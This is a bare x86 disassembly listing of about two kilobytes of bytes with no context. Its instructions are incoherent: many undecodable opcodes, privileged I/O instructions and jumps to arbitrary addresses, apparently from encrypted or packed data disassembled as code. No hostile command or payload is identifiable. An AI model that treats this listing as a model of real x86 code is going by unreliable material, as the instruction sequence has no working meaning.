  405e53:	jge    0x405e01
  405e55:	xlat   BYTE PTR ds:[ebx]
  405e56:	jmp    0xf640b9
  405e5b:	mov    dl,0x54
  405e5d:	fld    QWORD PTR [ecx]
  405e5f:	mov    ecx,0x7e51cdbe
  405e64:	adc    al,0x9
  405e66:	sub    esp,ecx
  405e68:	jmp    0x405ec8
  405e6a:	(bad)  
  405e6b:	or     dh,bl
  405e6d:	(bad)  
  405e6e:	xor    edx,DWORD PTR [ebx]
  405e70:	mov    al,0xc5
  405e72:	mov    ebx,0xd0f470ed
  405e77:	imul   edi,DWORD PTR [eax+esi*8-0x69],0x48
  405e7c:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  405e7e:	adc    DWORD PTR [edi],edx
  405e80:	pop    ds
  405e81:	push   ecx
  405e82:	shr    DWORD PTR [edx-0x7f],cl
  405e85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e86:	pop    ss
  405e87:	mov    eax,ds:0xd7556544
  405e8c:	rol    DWORD PTR [edx+0x11d9dd9c],1
  405e92:	lods   eax,DWORD PTR ds:[esi]
  405e93:	icebp  
  405e94:	test   ecx,esi
  405e96:	adc    esp,DWORD PTR [ebx]
  405e98:	les    ecx,FWORD PTR [esi+0x49]
  405e9b:	stos   DWORD PTR es:[edi],eax
  405e9c:	out    dx,eax
  405e9d:	jne    0x405e3a
  405e9f:	mov    eax,0x67c59030
  405ea4:	xchg   esi,eax
  405ea5:	arpl   WORD PTR [eax],di
  405ea7:	shl    BYTE PTR [eax+edx*1+0x254d5f19],cl
  405eae:	xor    esi,edi
  405eb0:	lahf   
  405eb1:	and    DWORD PTR [edi],edx
  405eb3:	dec    ebp
  405eb4:	fwait
  405eb5:	es jbe 0x405ed0
  405eb8:	(bad)  
  405eb9:	pop    edx
  405eba:	push   es
  405ebb:	push   ds
  405ebc:	mov    cl,0x54
  405ebe:	xchg   ecx,eax
  405ebf:	mov    edi,0xf6f20108
  405ec4:	dec    ebx
  405ec5:	or     dl,ch
  405ec7:	pop    ebp
  405ec8:	aaa    
  405ec9:	push   es
  405eca:	stos   DWORD PTR es:[edi],eax
  405ecb:	push   esp
  405ecc:	clc    
  405ecd:	lods   al,BYTE PTR ds:[esi]
  405ece:	aam    0x40
  405ed0:	imul   eax,DWORD PTR [ebx],0x6be73ef8
  405ed6:	dec    ebx
  405ed7:	xchg   ebp,eax
  405ed8:	or     edi,edx
  405eda:	mov    esi,0x4fa0056d
  405edf:	fld    DWORD PTR [edi]
  405ee1:	jl     0x405f46
  405ee3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ee4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ee5:	loop   0x405f09
  405ee7:	mov    bh,0xf6
  405ee9:	inc    ebp
  405eea:	adc    al,BYTE PTR [ecx+eiz*2]
  405eed:	cmp    bl,bl
  405eef:	inc    ebp
  405ef0:	jb     0x405ea7
  405ef2:	jnp    0x405ebe
  405ef4:	loop   0x405f6d
  405ef6:	dec    esp
  405ef7:	mov    cl,0x3e
  405ef9:	or     esp,ecx
  405efb:	sub    al,0x85
  405efd:	repnz test BYTE PTR [esi-0x6952d2d5],bl
  405f04:	outs   dx,DWORD PTR ds:[esi]
  405f05:	jmp    0x603fb97e
  405f0a:	cmc    
  405f0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f0c:	mov    al,0xbf
  405f0e:	mov    ch,0x7e
  405f10:	sub    DWORD PTR [edx+0x17],edi
  405f13:	je     0x405f2d
  405f15:	sbb    bh,bl
  405f17:	xor    BYTE PTR [edi-0x77e84a0f],dl
  405f1d:	out    dx,eax
  405f1e:	and    eax,0x85f9c2c6
  405f23:	jo     0x405ed5
  405f25:	sbb    DWORD PTR [ecx+0x50],0xffffffcc
  405f29:	dec    eax
  405f2a:	xlat   BYTE PTR ds:[ebx]
  405f2b:	outs   dx,DWORD PTR ds:[esi]
  405f2c:	shl    BYTE PTR [esi+eiz*8-0x52],1
  405f30:	bound  esi,QWORD PTR [edx+0x125a7243]
  405f36:	in     eax,dx
  405f37:	arpl   WORD PTR [eax-0x5bb5067c],cx
  405f3d:	inc    BYTE PTR gs:[ebx]
  405f40:	xchg   ebp,eax
  405f41:	cmp    esp,DWORD PTR [edx]
  405f43:	lea    edx,[ebx]
  405f45:	sub    al,0xbd
  405f47:	cmp    DWORD PTR [edi-0x21],esp
  405f4a:	xor    eax,0xc2f52f6f
  405f4f:	and    eax,DWORD PTR [esi-0x63]
  405f52:	icebp  
  405f53:	and    ecx,DWORD PTR [ecx-0x5e13cea6]
  405f59:	add    al,0x3f
  405f5b:	retf   0x6a82
  405f5e:	lock mov al,BYTE PTR [ebp+0x22]
  405f62:	neg    ebx
  405f64:	inc    edx
  405f65:	mov    ebp,0x3f322b13
  405f6a:	ins    DWORD PTR es:[edi],dx
  405f6b:	sbb    al,0x60
  405f6d:	mov    edi,0x99d39c17
  405f72:	jge    0x405f8f
  405f74:	popa   
  405f75:	ins    DWORD PTR es:[edi],dx
  405f76:	xor    dh,BYTE PTR [ebp+0x3d4ae2e0]
  405f7c:	mov    bh,0x33
  405f7e:	test   al,0x9d
  405f80:	jge    0x405f5a
  405f82:	sbb    al,0x7d
  405f84:	and    DWORD PTR [ebx+0x5e1f0d89],esi
  405f8a:	retf   0x13af
  405f8d:	xor    ebx,esi
  405f8f:	fwait
  405f90:	pop    es
  405f91:	pop    eax
  405f92:	inc    eax
  405f93:	lods   al,BYTE PTR ds:[esi]
  405f94:	mov    bl,0xb
  405f97:	sub    bh,BYTE PTR [edi+0x177fe593]
  405f9d:	xchg   edx,eax
  405f9e:	adc    DWORD PTR [ecx+0x40],edi
  405fa1:	push   ebx
  405fa2:	or     BYTE PTR [edx+0x9],al
  405fa5:	and    BYTE PTR [edi],0x6
  405fa8:	loope  0x405fc2
  405faa:	cmp    edi,DWORD PTR [ebp+0x2ef53358]
  405fb0:	aaa    
  405fb1:	nop
  405fb2:	sub    al,0xb1
  405fb4:	inc    ebx
  405fb5:	imul   ebx,esp,0xffffffdd
  405fb8:	add    al,0x18
  405fba:	in     al,dx
  405fbb:	(bad)  
  405fbc:	dec    esi
  405fbd:	loope  0x405f5a
  405fbf:	jl     0x406016
  405fc1:	push   cs
  405fc2:	inc    esi
  405fc3:	enter  0x2293,0x16
  405fc7:	(bad)  
  405fc8:	leave  
  405fc9:	test   BYTE PTR [edx],bh
  405fcb:	ds (bad) 
  405fcd:	out    dx,eax
  405fce:	sub    ah,BYTE PTR [eax+0x77e63b74]
  405fd4:	out    0x5e,eax
  405fd6:	mov    WORD PTR ds:0x5c581095,cs
  405fdc:	and    al,0xe2
  405fde:	push   ecx
  405fdf:	jne    0x405fa6
  405fe1:	js     0x405fdc
  405fe3:	xor    DWORD PTR [ebx],edi
  405fe5:	cdq    
  405fe6:	mov    bh,0xe2
  405fe8:	test   eax,0x19ae8b1c
  405fed:	mov    eax,ds:0x19e868ca
  405ff2:	and    bl,dl
  405ff4:	xchg   ebp,eax
  405ff5:	inc    edi
  405ff6:	or     ebp,DWORD PTR [ebp-0x345b9418]
  405ffc:	xor    DWORD PTR [edi+ecx*4+0x6b],0x61885dcc
  406004:	(bad)  
  406005:	hlt    
  406006:	pop    eax
  406007:	test   eax,0x638a193c
  40600c:	cli    
  40600d:	sbb    ch,BYTE PTR [ecx]
  40600f:	lock pop ebx
  406011:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406012:	pop    ecx
  406013:	or     DWORD PTR [eax+0x6b],edi
  406016:	pop    es
  406017:	sbb    eax,0xbae17264
  40601c:	dec    eax
  40601d:	pusha  
  40601e:	sbb    DWORD PTR [ebp-0x1c1e8e6e],0xfffffff6
  406025:	fsubr  st,st(1)
  406027:	mov    ebp,0x16a5ed76
  40602c:	shr    BYTE PTR [ecx],0x1f
  40602f:	xchg   ebx,eax
  406030:	cli    
  406031:	repz out 0x43,eax
  406034:	cld    
  406035:	mov    esp,0xc52c19c
  40603a:	inc    edi
  40603b:	popa   
  40603c:	(bad)  
  40603e:	jb     0x40601e
  406040:	repz push cs
  406042:	cmp    cl,bh
  406044:	scas   al,BYTE PTR es:[edi]
  406045:	cmp    al,BYTE PTR ds:0x5e43a890
  40604b:	ret    0x96b6
  40604e:	aas    
  40604f:	into   
  406050:	jle    0x4060ac
  406052:	(bad)  
  406053:	std    
  406054:	mov    edx,0xc71a1691
  406059:	test   cl,dh
  40605b:	iret   
  40605c:	in     eax,0xb
  40605e:	fwait
  40605f:	js     0x40604b
  406061:	ins    DWORD PTR es:[edi],dx
  406062:	loop   0x406006
  406064:	aam    0xeb
  406066:	add    eax,0x8f71154
  40606b:	call   FWORD PTR [edx+0x26]
  40606e:	or     dh,dl
  406070:	dec    edi
  406072:	(bad)  [edi-0x442559f5]
  406078:	dec    eax
  406079:	mov    ecx,0xf2150af
  40607e:	mov    ecx,0xcaae9750
  406083:	pusha  
  406084:	cs cwde 
  406086:	jbe    0x406048
  406088:	pop    ds
  406089:	push   eax
  40608a:	bound  ebx,QWORD PTR [edx+0x10e53514]
  406090:	jle    0x406080
  406092:	(bad)  
  406093:	fild   DWORD PTR [ebp+eiz*2-0x6]
  406098:	and    DWORD PTR [eax],ebp
  40609a:	xor    ebx,DWORD PTR [ebx-0x5bfecee0]
  4060a0:	ficom  DWORD PTR [ecx]
  4060a2:	sbb    eax,0x413cb1b9
  4060a7:	cmc    
  4060a8:	out    dx,al
  4060a9:	fsubr  QWORD PTR [edx+0x11]
  4060ac:	push   eax
  4060ad:	jne    0x40605c
  4060af:	mov    dl,0xf8
  4060b1:	mov    ch,0x8d
  4060b3:	jno    0x4060d4
  4060b5:	fs add eax,0x8f16a4c4
  4060bb:	shl    bh,1
  4060bd:	retf   
  4060be:	stos   DWORD PTR es:[edi],eax
  4060bf:	fimul  WORD PTR [ecx+0x2c7e8cd0]
  4060c5:	(bad)  
  4060c6:	dec    esp
  4060c7:	push   es
  4060c8:	ins    DWORD PTR es:[edi],dx
  4060c9:	sub    esi,0xeb4198fb
  4060cf:	inc    ebx
  4060d0:	pusha  
  4060d1:	test   BYTE PTR [edx+edi*4+0x61c0ecda],bh
  4060d8:	mov    bh,0xf2
  4060da:	jl     0x406112
  4060dc:	ja     0x40607e
  4060de:	icebp  
  4060df:	jecxz  0x406158
  4060e1:	ss hlt 
  4060e3:	shr    DWORD PTR [esi+0x4b21d9bf],1
  4060e9:	cmp    dl,ah
  4060eb:	jne    0x40609d
  4060ed:	jne    0x40609c
  4060ef:	retf   0x195a
  4060f2:	jmp    0xa3d565c6
  4060f7:	add    DWORD PTR [ebx+0x12f5d2e4],eax
  4060fd:	std    
  4060fe:	dec    esp
  4060ff:	jmp    0x4060aa
  406101:	cmc    
  406102:	rcr    DWORD PTR [ebx-0x6aad4060],1
  406108:	inc    esp
  406109:	adc    DWORD PTR [eax+0x78848258],edi
  40610f:	test   eax,0xf3b24623
  406114:	mov    cs,ebp
  406116:	lods   al,BYTE PTR ds:[esi]
  406117:	es aas 
  406119:	xchg   esp,eax
  40611a:	inc    eax
  40611b:	mov    ds:0xf0b28fa8,eax
  406120:	xlat   BYTE PTR ds:[ebx]
  406121:	mov    BYTE PTR [ebp+eax*1+0x41],cl
  406125:	repz lea ebp,[ecx*2-0x3dfc461]
  40612d:	frstor [ebx+ecx*1-0x6d09e57f]
  406134:	ror    DWORD PTR [ebx+0xb2ed77a],1
  40613a:	mov    al,ds:0xe87073da
  40613f:	mov    ebp,0xcf0ec0a3
  406144:	pop    es
  406145:	repnz sbb DWORD PTR [edx-0x59d0f14c],edi
  40614c:	icebp  
  40614d:	in     eax,dx
  40614e:	or     ebp,DWORD PTR [ebp+0x21]
  406151:	rol    BYTE PTR [ecx],1
  406153:	cld    
  406154:	mov    edi,DWORD PTR [ecx-0x65]
  406157:	mov    bl,0x9c
  406159:	inc    ebp
  40615a:	ss aam 0x51
  40615d:	fsubrp st(0),st
  40615f:	lds    edx,FWORD PTR [ebx]
  406161:	inc    esi
  406162:	fs jl  0x406133
  406165:	jp     0x406104
  406167:	xlat   BYTE PTR ds:[ebx]
  406168:	mov    eax,0x4d124e2a
  40616d:	ins    DWORD PTR es:[edi],dx
  40616e:	lahf   
  40616f:	add    DWORD PTR [ebx-0x6b11a480],eax
  406175:	and    esi,DWORD PTR [esi-0x2d]
  406178:	lea    esp,ds:0x54761096
  40617e:	idiv   esi
  406180:	or     BYTE PTR [ebx],dh
  406182:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406183:	xchg   esi,eax
  406184:	xlat   BYTE PTR ds:[ebx]
  406185:	cmc    
  406186:	xchg   BYTE PTR [ebp-0x4e3fe10d],bl
  40618c:	out    dx,al
  40618d:	xor    DWORD PTR ds:0x76542f0d,esi
  406193:	inc    edx
  406194:	xor    BYTE PTR [edx+0x59],ah
  406197:	stos   DWORD PTR es:[edi],eax
  406198:	or     DWORD PTR [edi],ecx
  40619a:	sub    dh,BYTE PTR [ebp+edx*8-0x67f035d4]
  4061a1:	mov    edx,0xf6f2efcb
  4061a6:	es mov bl,0x4c
  4061a9:	pop    edi
  4061aa:	add    DWORD PTR [esi+0x1b],esi
  4061ad:	in     eax,0x6
  4061af:	mov    dh,0x59
  4061b1:	dec    edi
  4061b2:	push   edx
  4061b3:	pusha  
  4061b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4061b5:	(bad)  
  4061b6:	loopne 0x406153
  4061b8:	addr16 pop ebx
  4061ba:	pop    ds
  4061bb:	aaa    
  4061bc:	dec    esp
  4061bd:	jp     0x40621e
  4061bf:	xchg   ecx,eax
  4061c0:	pop    edx
  4061c1:	scas   eax,DWORD PTR es:[edi]
  4061c2:	push   esi
  4061c3:	fstp   DWORD PTR [ebp+0x4e23ca4d]
  4061c9:	stc    
  4061ca:	std    
  4061cb:	ret    0x3bd1
  4061ce:	call   0x97b5:0x1fcd5e20
  4061d5:	push   es
  4061d6:	leave  
  4061d7:	xchg   DWORD PTR [ebx+0x3e4328ac],ecx
  4061dd:	arpl   WORD PTR [ecx-0xe],dx
  4061e0:	(bad)  
  4061e1:	in     al,dx
  4061e2:	loope  0x4061e1
  4061e4:	sub    al,0x89
  4061e6:	out    dx,eax
  4061e7:	fld    QWORD PTR [ebx-0x74]
  4061ea:	bound  esp,QWORD PTR [edx-0x67ee3896]
  4061f0:	sbb    BYTE PTR [eax],cl
  4061f2:	neg    ah
  4061f4:	xchg   esi,eax
  4061f5:	(bad)  
  4061f6:	(bad)  
  4061f7:	push   ecx
  4061f8:	mov    ecx,0xf6fb661e
  4061fd:	(bad)  
  4061fe:	lods   al,BYTE PTR ds:[esi]
  4061ff:	inc    edx
  406200:	dec    ecx
  406201:	and    dl,BYTE PTR [edi+edi*4-0x2099a20a]
  406208:	jl     0x406224
  40620a:	scas   eax,DWORD PTR es:[edi]
  40620b:	mov    ah,0x8
  40620d:	xchg   BYTE PTR [ebp+0x36],ch
  406210:	push   edx
  406211:	inc    edi
  406212:	adc    edi,DWORD PTR [esi-0x25abc493]
  406218:	popf   
  406219:	into   
  40621a:	and    dh,BYTE PTR [esi+0x48cd253]
  406220:	adc    al,0x1d
  406222:	in     eax,dx
  406223:	dec    ecx
  406224:	retf   0xf5e4
  406227:	push   ds
  406228:	inc    edx
  406229:	sub    bl,dh
  40622b:	stc    
  40622c:	or     al,0x57
  40622e:	aaa    
  40622f:	loope  0x40627a
  406231:	inc    eax
  406232:	pop    edi
  406233:	sbb    al,0xfd
  406235:	popa   
  406236:	xchg   DWORD PTR [eax],esp
  406238:	mov    BYTE PTR [ecx-0x47],dh
  40623b:	fsubr  st(0),st
  40623d:	jo     0x40623d
  40623f:	div    BYTE PTR [esi+edi*1]
  406242:	(bad)
  406246:	and    al,0x1f
  406248:	(bad)  
  406249:	sub    esi,edx
  40624b:	push   eax
  40624c:	adc    edx,ebx
  40624e:	repnz pop esp
  406250:	inc    edi
  406251:	sbb    DWORD PTR [edi],edi
  406253:	mov    esi,0xe39b9e8f
  406258:	mov    ebx,0xa01620b
  40625d:	repnz daa 
  40625f:	cs mov edi,esi
  406262:	pushf  
  406263:	stos   DWORD PTR es:[edi],eax
  406264:	mov    ch,0x6c
  406266:	(bad)  
  406267:	adc    al,0xe4
  406269:	addr16 mov bl,0x88
  40626c:	fstp   DWORD PTR [eax]
  40626e:	pop    eax
  40626f:	mov    es,WORD PTR [ecx-0x74]
  406272:	arpl   di,di
  406274:	fild   QWORD PTR [edx-0x572e0d12]
  40627a:	adc    al,0xcf
  40627c:	mov    edx,0xcea58397
  406281:	sbb    al,0x7c
  406283:	mov    al,ds:0x24674000
  406288:	jmp    0x8ba5:0xbfeaf7cc
  40628f:	inc    ecx
  406290:	fwait
  406291:	jg     0x406213
  406293:	dec    ebp
  406294:	out    dx,eax
  406295:	leave  
  406296:	mov    ch,0x6f
  406298:	pop    es
  406299:	sub    BYTE PTR [esi+esi*8+0x36b1e5d6],cl
  4062a0:	aaa    
  4062a1:	jmp    0x8e54e45d
  4062a6:	push   edx
  4062a7:	rol    DWORD PTR [edx-0x2f],0x31
  4062ab:	int    0x80
  4062ad:	dec    eax
  4062ae:	int3   
  4062af:	push   eax
  4062b0:	xchg   BYTE PTR [ecx+0x49],bl
  4062b3:	mov    esp,0xe3c5391e
  4062b8:	mov    ebp,0x79e08b2d
  4062bd:	bnd call 0xda9e573b
  4062c3:	dec    ebp
  4062c4:	and    eax,DWORD PTR [edi]
  4062c6:	js     0x406298
  4062c8:	dec    eax
  4062c9:	cmp    DWORD PTR [ebp+ebp*8+0x59304625],ecx
  4062d0:	(bad)  
  4062d1:	ds add eax,edi
  4062d4:	pusha  
  4062d5:	mov    WORD PTR [ebp-0x7d98aedc],fs
  4062db:	xchg   ecx,eax
  4062dc:	pop    ebp
  4062dd:	pop    ss
  4062de:	and    BYTE PTR [eax],dl
  4062e0:	dec    esp
  4062e1:	push   es
  4062e2:	hlt    
  4062e3:	fs jg  0x4062c5
  4062e6:	push   ebp
  4062e7:	pushf  
  4062e8:	std    
  4062e9:	iret   
  4062ea:	repz pop ss
  4062ec:	cmp    dl,bh
  4062ee:	loope  0x406289
  4062f0:	xchg   esp,eax
  4062f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4062f2:	jl     0x40630c
  4062f4:	mov    ds:0x72cd4c2a,al
  4062f9:	sbb    DWORD PTR [esi+0x69],esp
  4062fc:	sahf   
  4062fd:	or     al,BYTE PTR [edx]
  4062ff:	add    ebp,DWORD PTR [ebx+0x64]
  406302:	shr    DWORD PTR [eax],0x13
  406305:	retf   0x3cd2
  406308:	adc    BYTE PTR [edx+0x14ff1c11],bh
  40630e:	push   ebx
  40630f:	or     al,0xfc
  406311:	dec    ebx
  406312:	inc    eax
  406313:	fst    DWORD PTR [edx]
  406315:	test   bh,ah
  406317:	and    ebp,edx
  406319:	jns    0x406385
  40631b:	not    DWORD PTR [edx+0x1010060f]
  406321:	mov    ds:0x2987679f,al
  406326:	aam    0x2a
  406328:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406329:	int3   
  40632a:	pop    ebx
  40632b:	push   edi
  40632c:	fs push ss
  40632e:	sbb    ecx,DWORD PTR [ecx]
  406330:	imul   esi,DWORD PTR [edx+0x45594c11],0x6
  406337:	and    eax,0xd5979187
  40633c:	shl    BYTE PTR [eax],1
  40633e:	sbb    DWORD PTR [ecx+eax*4],ecx
  406341:	and    edx,ebx
  406343:	out    dx,al
  406344:	pop    ecx
  406345:	idiv   BYTE PTR [edi-0x12334980]
  40634b:	jmp    0x406321
  40634d:	das    
  40634e:	sahf   
  40634f:	and    ah,ch
  406351:	inc    ecx
  406352:	mov    edi,0x84d36e92
  406357:	push   edi
  406358:	mov    bl,0x7e
  40635a:	repz pop ss
  40635c:	adc    eax,0x39dd77b1
  406361:	inc    ecx
  406362:	shr    DWORD PTR [edi+0x2d],1
  406365:	outs   dx,DWORD PTR ds:[esi]
  406366:	(bad)  
  406367:	jno    0x40637e
  406369:	pop    es
  40636a:	push   ebp
  40636b:	sub    eax,0xb198d1a6
  406370:	adc    BYTE PTR [edi],dl
  406372:	cmc    
  406373:	nop
  406374:	ins    DWORD PTR es:[edi],dx
  406375:	xchg   ebx,eax
  406376:	mov    ds:0xf621e508,al
  40637b:	outs   dx,DWORD PTR ds:[esi]
  40637c:	mov    DWORD PTR [eax-0x72],esi
  40637f:	push   ds
  406380:	icebp  
  406381:	mov    ecx,0xb935259e
  406386:	ins    BYTE PTR es:[edi],dx
  406387:	xor    DWORD PTR [ebp-0x366e6808],edi
  40638d:	aam    0x4
  40638f:	cmp    edx,DWORD PTR [ebx+0xa21ff04]
  406395:	pushf  
  406396:	fstp   TBYTE PTR [edi+0x78fb4a06]
  40639c:	dec    ax
  40639e:	fwait
  40639f:	out    dx,eax
  4063a0:	pop    ss
  4063a1:	int3   
  4063a2:	stos   DWORD PTR es:[edi],eax
  4063a3:	je     0x4063b9
  4063a5:	pop    edx
  4063a6:	or     DWORD PTR [edx+edx*8+0x2a0bb46a],ebx
  4063ad:	lock mov ds,WORD PTR [ebx+ebx*2]
  4063b1:	das    
  4063b2:	mov    esp,0xccaebfd0
  4063b7:	mov    dh,0xf8
  4063b9:	imul   ebx,DWORD PTR ds:0xcb28db58,0x457bea44
  4063c3:	fadd   QWORD PTR [edi-0x45]
  4063c6:	cmp    BYTE PTR [esi],0x1a
  4063c9:	jns    0x4063fa
  4063cb:	jmp    0x40643d
  4063cd:	js     0x40638b
  4063cf:	sbb    BYTE PTR [edx+0x61],dl
  4063d2:	nop
  4063d3:	pusha  
  4063d4:	xchg   BYTE PTR [edi],dh
  4063d6:	daa    
  4063d7:	mov    ebx,0xb2477c15
  4063dc:	pop    ss
  4063dd:	lea    esi,[esi-0x7d]
  4063e0:	clc    
  4063e1:	mov    BYTE PTR [ebx-0x408166a1],cl
  4063e7:	push   cs
  4063e8:	ret    0x8858
  4063eb:	jns    0x406379
  4063ed:	dec    ecx
  4063ee:	loopne 0x406455
  4063f0:	add    eax,0x1adea8f1
  4063f5:	jg     0x406441
  4063f7:	add    DWORD PTR [edx+eiz*2+0xe],esi
  4063fb:	jl     0x4063a8
  4063fd:	push   ebx
  4063fe:	imul   edx,DWORD PTR [ebp+0x65],0xa9a6edb0
  406405:	and    al,cl
  406407:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406408:	push   DWORD PTR [ecx]
  40640a:	div    bh
  40640c:	jge    0x4063e8
  40640e:	xor    esp,DWORD PTR ds:0x5eec5f0a
  406414:	addr16 out dx,al
  406416:	nop
  406417:	adc    ebx,edx
  406419:	sbb    eax,0x4dd2eb25
  40641e:	test   BYTE PTR [eax-0x4c891383],dl
  406424:	jns    0x40641f
  406426:	out    dx,eax
  406427:	repz jmp 0x4063e2
  40642a:	inc    ebx
  40642b:	stc    
  40642c:	mov    ebp,0xd602fb8e
  406431:	inc    eax
  406432:	iret   
  406433:	pusha  
  406434:	mul    BYTE PTR cs:[ecx+0x23]
  406438:	jmp    0x5c94:0x26e6c15e
  40643f:	fwait
  406440:	xlat   BYTE PTR ds:[ebx]
  406441:	mov    edi,0x9ee917e
  406446:	es push ebx
  406448:	fsubr  DWORD PTR [edx-0x68c191bf]
  40644e:	nop
  40644f:	xchg   BYTE PTR [ebp+0x17],bh
  406452:	fld    QWORD PTR [edx-0x64]
  406455:	inc    ecx
  406456:	jne    0x4064b8
  406458:	sub    BYTE PTR [edi+0x2f7afd85],bh
  40645e:	or     eax,0x38900ce4
  406463:	mov    dl,0x84
  406465:	(bad)  
  406466:	or     al,0xa8
  406468:	mov    dl,0x8d
  40646a:	imul   ebx,DWORD PTR [edi],0x97a42c29
  406470:	pop    DWORD PTR [eax-0x7]
  406473:	push   edx
  406474:	push   ebx
  406475:	jae    0x40649a
  406477:	sub    al,0xf8
  406479:	in     eax,0xc8
  40647b:	inc    ebx
  40647c:	jnp    0x4064e1
  40647e:	mov    eax,DWORD PTR [esi+eax*4+0x53]
  406482:	pop    ds
  406483:	scas   al,BYTE PTR es:[edi]
  406484:	mov    esp,0xc3259538
  406489:	push   ecx
  40648a:	push   0x6d9e2d1a
  40648f:	js     0x406500
  406491:	or     al,0x44
  406493:	mov    al,ds:0xe9a77775
  406498:	lea    edx,[ebx-0x5f682840]
  40649e:	jl     0x406498
  4064a0:	into   
  4064a1:	(bad)  
  4064a2:	push   0x17f6841
  4064a7:	pop    ss
  4064a8:	fdiv   DWORD PTR [ebp+0x3fed113c]
  4064ae:	inc    ecx
  4064af:	retf   
  4064b0:	jne    0x406463
  4064b2:	scas   al,BYTE PTR es:[edi]
  4064b3:	jo     0x406440
  4064b5:	fstp   DWORD PTR [edx-0x2014010]
  4064bb:	data16 and BYTE PTR [ecx+0x436c8607],dh
  4064c2:	jge    0x4064ea
  4064c4:	idiv   BYTE PTR [ebp-0x4b7e8722]
  4064ca:	or     al,BYTE PTR [ecx+eiz*4-0x40]
  4064ce:	ins    BYTE PTR es:[edi],dx
  4064cf:	scas   eax,DWORD PTR es:[edi]
  4064d0:	daa    
  4064d1:	jo     0x406473
  4064d3:	dec    esp
  4064d4:	and    dl,ch
  4064d6:	adc    eax,0x34058004
  4064db:	leave  
  4064dc:	imul   ebp,edx,0x962722ec
  4064e2:	adc    cl,dh
  4064e4:	std    
  4064e5:	test   al,0x26
  4064e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064e8:	push   edi
  4064e9:	aaa    
  4064ea:	call   0x5fe99f18
  4064ef:	mov    ?,WORD PTR [edi]
  4064f1:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4064f3:	push   esp
  4064f4:	or     eax,edx
  4064f6:	xor    dl,ah
  4064f8:	push   ss
  4064f9:	mov    gs,WORD PTR [esp+esi*2]
  4064fc:	jb     0x40648e
  4064fe:	mov    bh,0x4c
  406500:	adc    ch,BYTE PTR [edx+0x52]
  406503:	adc    DWORD PTR [ebx+0x6ef8d4fb],esi
  406509:	sub    al,BYTE PTR [eax]
  40650b:	popa   
  40650c:	pop    eax
  40650d:	push   esi
  40650e:	pop    ds
  40650f:	lea    ebp,[edi]
  406511:	retf   0x4cf2
  406514:	xchg   DWORD PTR [edx-0x1],edx
  406517:	mov    ebx,0x45f6a56e
  40651c:	or     dl,BYTE PTR [eax+0x767f0f51]
  406522:	je     0x4065a2
  406524:	push   eax
  406525:	out    dx,eax
  406526:	shl    BYTE PTR ds:0x3d1f0a17,0xa6
  40652d:	aad    0x7c
  40652f:	rcl    DWORD PTR [ebp+0x377c6f5],cl
  406535:	mov    esp,DWORD PTR [ebx-0x4dd3cd90]
  40653b:	xor    esi,DWORD PTR [edx+0x5e30187a]
  406541:	jb     0x4065be
  406543:	push   ss
  406544:	push   0x2a47ac19
  406549:	fcom   QWORD PTR [ebx]
  40654b:	cs cwde 
  40654d:	dec    eax
  40654e:	je     0x4065a1
  406550:	xor    al,0x1d
  406552:	mov    cl,0x1e
  406554:	jne    0x4065a3
  406556:	pop    ds
  406557:	mov    eax,0x388afe75
  40655c:	add    BYTE PTR [esi],cl
  40655e:	lods   eax,DWORD PTR ds:[esi]
  40655f:	pop    ebx
  406560:	loop   0x406552
  406562:	mov    al,0x7b
  406564:	sbb    BYTE PTR [eax],cl
  406566:	fisttp DWORD PTR [esi+0x77cf0b39]
  40656c:	inc    ebp
  40656d:	in     al,dx
  40656e:	push   ss
  40656f:	cmp    cl,BYTE PTR [eax+0x15]
  406572:	or     DWORD PTR [esi+ebx*2],esp
  406575:	push   ecx
  406576:	pusha  
  406577:	jne    0x406578
  406579:	or     ah,0xf1
  40657c:	cmp    BYTE PTR [ecx+0x60],cl
  40657f:	out    0xdc,al
  406581:	xor    al,0xb8
  406583:	mov    dl,0xba
  406585:	cmp    edx,ecx
  406587:	cwde   
  406588:	mov    al,0xa4
  40658a:	aad    0xd2
  40658c:	and    DWORD PTR [edi+eiz*2],esp
  40658f:	add    eax,0x2fa2036d
  406594:	mov    ebp,0x5b2dc566
  406599:	xor    eax,0xe2d06444
  40659e:	sub    al,0x35
  4065a0:	test   DWORD PTR [eax+0x6ac21602],ecx
  4065a6:	in     eax,dx
  4065a7:	pop    esi
  4065a8:	or     edx,ebx
  4065aa:	test   eax,0x30659f84
  4065af:	mov    eax,ds:0x7098e6ba
  4065b4:	ror    DWORD PTR [ecx+0x7c],cl
  4065b7:	dec    ebp
  4065b8:	cmp    eax,0xa8b30216
  4065bd:	push   0xffffff8f
  4065bf:	xor    dl,bh
  4065c1:	cli    
  4065c2:	dec    eax
  4065c3:	dec    edi
  4065c4:	and    DWORD PTR [ebx],edx
  4065c6:	aad    0xf2
  4065c8:	and    BYTE PTR [eax+ecx*4],bl
  4065cb:	cmp    esi,ebp
  4065cd:	pop    esp
  4065ce:	stos   DWORD PTR es:[edi],eax
  4065cf:	ret    
  4065d0:	dec    eax
  4065d1:	xchg   edi,eax
  4065d2:	nop
  4065d3:	loope  0x40656e
  4065d5:	and    edi,DWORD PTR [ecx+0x2dd329c0]
  4065db:	cld    
  4065dc:	mov    bl,0xa9
  4065de:	in     al,0x48
  4065e0:	xor    eax,0x9b0ec342
  4065e5:	nop
  4065e6:	sub    al,0x71
  4065e8:	hlt    
  4065e9:	hlt    
  4065ea:	push   0xf37e3b37
  4065ef:	mov    edx,0x11ab72c6
  4065f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4065f5:	push   ecx
  4065f6:	sub    BYTE PTR [edx-0x2],dh
  4065f9:	sbb    al,0xa
  4065fb:	inc    edi
  4065fc:	or     bh,BYTE PTR [edx-0x4baf279f]
  406602:	stos   BYTE PTR es:[edi],al
  406603:	cld    
